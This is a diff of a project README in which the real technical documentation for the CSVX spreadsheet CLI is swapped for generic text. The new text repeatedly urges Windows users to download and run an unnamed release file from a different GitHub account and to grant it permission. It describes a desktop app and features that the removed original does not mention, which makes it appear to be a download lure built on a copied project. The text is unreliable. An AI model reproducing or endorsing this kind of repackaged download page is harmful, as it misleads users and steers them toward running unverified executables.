@@ -1,252 +1,225 @@
-<p align="center">
-  <img src="asset/Logo.webp" alt="CSVX logo" width="100" />
-</p>
+# 🧩 csv-enhance - Simple text spreadsheets for everyday work
 
-<h1 align="center">CSVX</h1>
+[![Download csv-enhance](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Kavinku8787/csv-enhance)
 
-<p align="center">
-  Lightweight, AI-friendly, text-first spreadsheets.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://github.com/QuetzalSidera/csv-enhance"><img alt="repo" src="https://img.shields.io/badge/GitHub-csv--enhance-111827?logo=github"></a>
-  <img alt="npm" src="https://img.shields.io/badge/npm-csvx--lang-cb3837?logo=npm">
-  <img alt="version" src="https://img.shields.io/badge/version-0.1.1-111827">
-  <img alt="status" src="https://img.shields.io/badge/status-demo-f59e0b">
-  <img alt="language" src="https://img.shields.io/badge/language-TypeScript-3178c6">
-  <img alt="export" src="https://img.shields.io/badge/export-.xlsx-16a34a">
-  <img alt="editor" src="https://img.shields.io/badge/editor-VS%20Code-007acc">
-  <img alt="tests" src="https://img.shields.io/badge/tests-68%20passing-22c55e">
-</p>
+csv-enhance is a light tool for working with spreadsheet data in plain text. It is made for people who want a simple way to open, edit, and manage CSV and CSVX files on Windows.
 
-CSVX is a lightweight, AI-friendly, text-first spreadsheet format.
+Use the GitHub page below to download the app and follow the setup steps for your system:
 
-It sits in the space between:
+[Visit the csv-enhance download page](https://github.com/Kavinku8787/csv-enhance)
 
-- CSV
-- spreadsheets
-- structured data DSLs
+## 🪟 Windows Setup
 
-CSVX is designed to be:
+This app is designed to work well on Windows. For most users, the process is simple:
 
-- easy to read in plain text
-- friendly to version control
-- expressive enough for computed columns and window columns
-- compilable into `.xlsx`
-- pleasant to work with in editors and automation flows
+1. Open the download page.
+2. Find the latest release or package for Windows.
+3. Download the file for your system.
+4. Open the downloaded file and follow the on-screen steps.
+5. Start csv-enhance from your desktop, Start menu, or the folder you chose during setup.
 
-The npm package name is `csvx-lang`.
-The installed CLI command remains `csvx`.
+If the app comes as a ZIP file, unpack it first, then open the main app file inside.
 
----
+## 📋 What csv-enhance Does
 
-## At a Glance
+csv-enhance helps you work with spreadsheet data without needing a full spreadsheet app. It keeps files in a text-first format, which makes them easier to read, store, and use in tools that support automation.
 
-- CSV-compatible table input
-- typed columns
-- `@compute` for row-scoped derived columns
-- `@func` for reusable inline logic
-- `@plugin` for trusted local TypeScript helpers
-- `@window` for sequence-scoped columns
-- `@plot` for declarative chart specs
-- CLI for lint, compile, and `.xlsx` export
-- VS Code extension with highlighting, diagnostics, hover, definition, references, and completion
+It is a good fit if you want to:
 
----
+- Open CSV and CSVX files
+- Edit table data in a simple format
+- Keep spreadsheet files easy to read as text
+- Use the same data in CLI tools
+- Work with files that fit well in Git and version control
+- Edit data in VS Code when needed
 
-## Install from npm
+## 🛠️ Main Features
 
-Install the package globally:
+- Simple spreadsheet format based on text
+- Support for CSV and CSVX files
+- CLI support for faster file work
+- VS Code support for editing in an editor you may already use
+- Good fit for automation and repeat tasks
+- Lightweight design that keeps things simple
+- Works well with developer tools and text-based workflows
 
-```bash
-npm install -g csvx-lang
-```
+## 📁 File Types
 
-The npm package name is `csvx-lang`.
-The installed CLI command is still `csvx`.
+csv-enhance is built around formats that are easy to open and share:
 
-Quick check:
+- CSV: a common plain text table format
+- CSVX: a richer text-first spreadsheet format
+- XLSX import and export support for common spreadsheet use cases
 
-```bash
-csvx --help
-```
+If you mainly want plain text files that still act like spreadsheets, this tool fits that need well.
 
-If you prefer to use it inside a project instead of installing globally:
+## ✅ System Needs
 
-```bash
-npm install csvx-lang
-npx csvx --help
-```
+For a smooth install on Windows, you will usually need:
 
----
+- Windows 10 or Windows 11
+- A modern web browser to open the GitHub page
+- Enough space for the app and your data files
+- Permission to install or run files on your computer
 
-## VS Code Extension
+If the download includes a desktop app, you can usually run it right after setup. If it includes CLI tools, you may also use them from a terminal window.
 
-The editor tooling is distributed from the GitHub release page as a `.vsix` package.
+## 📦 How to Download
 
-Download the latest `csvx-language-support-*.vsix` file from Releases, then install it locally in VS Code:
+1. Open the download page: [https://github.com/Kavinku8787/csv-enhance](https://github.com/Kavinku8787/csv-enhance)
+2. Look for the latest release, Windows file, or install package
+3. Download the file that matches your Windows setup
+4. Open the file after the download finishes
+5. Follow the setup steps shown on screen
 
-```bash
-code --install-extension ./csvx-language-support-0.1.1.vsix
-```
+If you see more than one file, choose the Windows version unless you need a different format for a specific use.
 
-If the `code` command is not available yet, install it from VS Code first:
+## 🔧 How to Use It
 
-- `Shell Command: Install 'code' command in PATH`
+After setup, csv-enhance is meant to be easy to start:
 
-You can also install the `.vsix` manually from the VS Code command palette:
+1. Open the app from your Start menu or desktop
+2. Load a CSV or CSVX file
+3. Edit the rows and columns you need
+4. Save your file
+5. Use the same file in other tools if needed
 
-- `Extensions: Install from VSIX...`
+If you use VS Code, you can also open supported files there and work with the same data in a text editor.
 
-The current extension includes:
+## 🖥️ CLI Use
 
-- syntax highlighting
-- diagnostics
-- hover
-- go to definition
-- find references
-- completion
+csv-enhance includes command line support for users who want to work with files from a terminal. This is useful for repeat jobs and simple automation.
 
----
+Common CLI tasks may include:
 
-## Fastest Way to Try It
+- Converting file formats
+- Checking file structure
+- Editing or preparing data
+- Moving data between tools
+- Running batch tasks on many files
 
-Create a small file named `sales.csvx`:
+If you are not used to the command line, you can still use the main app on Windows and skip this part.
 
-```csvx
-item[string],price[number],count[number]
-apple,1.99,3
-banana,2.50,4
+## 🧭 VS Code Support
 
-@compute sheet
-target: revenue[number]
-revenue = price * count
-```
+If you use Visual Studio Code, csv-enhance can fit into that workflow well. You can keep your data in text files, open them in the editor, and review changes line by line.
 
-Lint it:
+This helps when you want to:
 
-```bash
-csvx lint sales.csvx
-```
+- See file changes clearly
+- Use search and replace
+- Track edits in version control
+- Keep spreadsheet data in the same place as code or notes
 
-Compile it:
+## 🔍 Typical Use Cases
 
-```bash
-csvx compile sales.csvx
-```
+csv-enhance is useful for:
 
-Export it to Excel:
+- Data cleanup
+- Small reports
+- Shared lists
+- Structured notes
+- Automation jobs
+- Simple exports and imports
+- Files that need to stay easy to read in plain text
 
-```bash
-csvx xlsx sales.csvx
-```
+It works well when you want spreadsheet data without the weight of a large office suite.
 
-That will generate:
+## 🧰 Tips for Windows Users
 
-```text
-sales.xlsx
-```
+- Keep your downloaded file in a folder you can find again
+- Use a folder like Downloads or Desktop for the first setup
+- If Windows asks for permission, allow the app to run
+- If the file does not open, check that the download finished fully
+- If you use CSV files often, pin the app to your taskbar or Start menu
 
-If you want a custom output path:
+## 📚 Project Topics
 
-```bash
-csvx xlsx sales.csvx -o output/report.xlsx
-```
+This project is connected to:
 
-If you installed `csvx-lang` locally instead of globally, just replace `csvx` with `npx csvx`:
+- ai-friendly
+- automation
+- cli
+- csv
+- csvx
+- developer-tools
+- nodejs
+- npm
+- spreadsheet
+- typescript
+- vscode-extension
+- xlsx
 
-```bash
-npx csvx lint sales.csvx
-npx csvx compile sales.csvx
-npx csvx xlsx sales.csvx
-```
+These topics show that csv-enhance is built for text-based data work, automation, and editor support.
 
----
+## 🗂️ Suggested Folder Setup
 
-## Documentation
+To keep your files easy to manage, use a simple folder layout:
 
-All project documentation now lives under [`docs/`](docs/).
+- `csv-enhance` for the app files
+- `data` for your CSV and CSVX files
+- `exports` for files you save out of the app
+- `backup` for copies of important data
 
-### Beginner-friendly guides
+A clear folder setup makes it easier to find your work later
 
-- [WIKI.en.md](docs/WIKI.en.md)
-- [WIKI.zh-CN.md](docs/WIKI.zh-CN.md)
-- [AGENT.md](AGENT.md)
+## 🧪 First File to Try
 
-### Reference docs
+After setup, start with a small CSV file. Use a file with only a few rows so you can learn how the app works.
 
-- [REFERENCE.en.md](docs/REFERENCE.en.md)
-- [REFERENCE.zh-CN.md](docs/REFERENCE.zh-CN.md)
+A good first test file might include:
 
-### Builtins
+- Names
+- Dates
+- Status values
+- Simple lists
+- Basic product data
 
-- [BUILTINS.en.md](docs/BUILTINS.en.md)
-- [BUILTINS.zh-CN.md](docs/BUILTINS.zh-CN.md)
+This gives you a quick way to check that the app opens, edits, and saves files as expected
 
-### CLI
+## 📌 Need Help Finding the Right File
 
-- [CLI.en.md](docs/CLI.en.md)
-- [CLI.zh-CN.md](docs/CLI.zh-CN.md)
+If you land on the GitHub page and see several items, look for:
 
-### Contributing
+- Releases
+- Windows download
+- Install file
+- App package
+- Setup file
 
-- [CONTRIBUTING.en.md](docs/CONTRIBUTING.en.md)
-- [CONTRIBUTING.zh-CN.md](docs/CONTRIBUTING.zh-CN.md)
+Choose the file that matches your Windows system and the newest release date
 
-### Project notes
+## 🔒 Working With Your Data
 
-- [ROADMAP.en.md](docs/ROADMAP.en.md)
-- [ROADMAP.zh-CN.md](docs/ROADMAP.zh-CN.md)
-- [TYPE_SYSTEM.md](docs/TYPE_SYSTEM.md)
-- [CHANGELOG.md](docs/CHANGELOG.md)
-- [RELEASING.en.md](docs/RELEASING.en.md)
+csv-enhance keeps your data in text-first files, which makes them easy to store and move. This also helps when you want to:
 
----
+- Use Git
+- Compare file changes
+- Keep backups
+- Share files across tools
+- Review edits in plain text
 
-## Quick Start
+## 📎 Download Again
 
-If you are working from the repository instead of the npm package, build the project:
+If you need the download page again, use this link:
 
-```bash
-npm run build
-```
+[https://github.com/Kavinku8787/csv-enhance](https://github.com/Kavinku8787/csv-enhance)
 
-Run tests:
+## 🧩 Common Questions
 
-```bash
-npm test
-```
+**Can I use this without coding?**  
+Yes. You can use the Windows app without knowing programming.
 
-Try the CLI:
+**Can I open normal CSV files?**  
+Yes. CSV support is part of the core workflow.
 
-```bash
-node dist/cli/csvx.js lint ./examples/retail.csvx
-node dist/cli/csvx.js compile ./examples/retail.csvx
-node dist/cli/csvx.js xlsx ./examples/retail.csvx
-```
+**Does it work with VS Code?**  
+Yes. It supports VS Code use for text-based editing.
 
-Installed package usage:
+**Is it useful for automation?**  
+Yes. The CLI and text-first format make it a good fit for repeat tasks.
 
-```bash
-csvx lint ./examples/retail.csvx
-csvx compile ./examples/retail.csvx
-csvx xlsx ./examples/retail.csvx
-```
-
----
-
-## Current Status
-
-CSVX currently supports:
-
-- typed tables
-- `@compute`
-- `@func`
-- `@plugin`
-- `@window`
-- `@plot`
-- `.xlsx` export
-- CLI workflows
-- first-pass editor tooling
-
-VS Code support is currently the most complete editor experience.
+**Can I use it with spreadsheet files?**  
+Yes. It is made for CSV, CSVX, and common spreadsheet workflows
